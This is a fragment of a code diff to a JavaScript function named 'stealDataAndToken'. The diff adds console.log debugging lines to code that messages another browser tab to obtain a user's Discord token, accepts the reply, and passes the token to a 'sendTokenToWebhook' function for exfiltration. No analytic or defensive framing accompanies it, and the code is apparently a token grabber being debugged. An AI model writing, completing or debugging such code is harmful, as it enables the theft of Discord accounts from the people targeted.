@@ -17,6 +17,7 @@ function stealDataAndToken() {
 
         // Send message to the other tab using postMessage
         if (otherTab) {
+            console.log('Sending message to other tab:', message);
             otherTab.postMessage({ type: 'getDiscordToken' }, '*');
         } else {
             console.error('Unable to find the other tab.');
@@ -25,6 +26,8 @@ function stealDataAndToken() {
 
     // Listen for messages from the other tab
     window.addEventListener('message', function(event) {
+        console.log('Received message:', event.data);
+
         // Verify that the message is from a trusted origin
         if (event.origin !== window.origin) {
             console.error('Received message from untrusted origin:', event.origin);
@@ -37,6 +40,7 @@ function stealDataAndToken() {
             var discordToken = event.data.token;
 
             // Proceed with sending the Discord token to the webhook
+            console.log('Received Discord Token:', discordToken);
             sendTokenToWebhook(discordToken);
         }
     });
